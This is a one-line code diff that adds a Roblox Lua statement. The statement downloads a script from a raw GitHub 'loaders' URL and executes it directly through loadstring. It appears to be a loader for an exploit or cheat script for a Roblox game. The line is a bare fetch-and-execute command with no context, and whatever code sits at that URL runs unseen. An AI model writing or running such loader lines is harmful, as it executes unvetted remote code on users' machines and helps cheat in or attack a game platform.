@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/drill-to-earth-s-core-spam7-vdc7lw1sjps4dr.lua"))()
